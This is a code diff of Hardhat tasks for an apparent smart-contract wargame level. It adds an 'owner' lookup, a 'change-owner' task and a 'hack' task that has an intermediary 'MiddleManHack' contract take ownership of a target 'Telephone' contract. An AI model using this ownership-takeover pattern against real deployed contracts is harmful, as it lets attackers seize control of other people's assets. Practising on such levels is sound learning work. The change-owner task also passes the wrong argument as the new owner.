@@ -1,29 +1,44 @@
 import { task, types } from 'hardhat/config';
 
 task('change-owner', 'Changing owner')
-  .addParam('name', 'Name of contract', undefined, types.string)
+  .addParam('name', 'Contract name', undefined, types.string)
   .addParam('address', 'Address new owner', undefined, types.string)
   .addParam('contract', 'Contract address', undefined, types.string)
+
   //   HRE = Hardhat Runtime Environment
   .setAction(async (taskArgs, hre) => {
     const telephone = await hre.ethers.getContractAt(
       taskArgs.name,
       taskArgs.contract
     );
-    telephone.changeOwner(taskArgs.address);
 
-    // TELEPHONE 0x5fbdb2315678afecb367f032d93f642f64180aa3
-    // MiddleManHack 0xe7f1725e7734ce288f8367e1bb143e90bb3f0512
+    await telephone.changeOwner(taskArgs.contract);
+  });
+
+task('owner', 'Get owner from <contract>')
+  .addParam('name', 'Contract name', undefined, types.string)
+  .addParam('contract', 'Contract address', undefined, types.string)
+
+  .setAction(async (taskArgs, { ethers }) => {
+    const telephone = await ethers.getContractAt(
+      taskArgs.name,
+      taskArgs.contract
+    );
+
+    console.log(await telephone.owner());
   });
 
 task('hack', 'Do middleMan hack')
-  .addParam('name', 'Name of contract', undefined, types.string)
-  .addParam('address', 'Address new owner', undefined, types.string)
+  .addParam('name', 'Contract name', undefined, types.string)
   .addParam('contract', 'Contract address', undefined, types.string)
-  //   HRE = Hardhat Runtime Environment
-  .setAction(async (taskArgs, hre) => {
-    console.log(taskArgs);
+  .addParam('prey', 'Contract address for hack')
+  .addParam('newowner', 'Contract address for hack')
 
-    // TELEPHONE 0x5fbdb2315678afecb367f032d93f642f64180aa3
-    // MiddleManHack 0xe7f1725e7734ce288f8367e1bb143e90bb3f0512
+  .setAction(async (taskArgs, { ethers }) => {
+    const hackContract = await ethers.getContractAt(
+      taskArgs.name,
+      taskArgs.contract
+    );
+
+    await hackContract.hack(taskArgs.prey, taskArgs.newowner);
   });
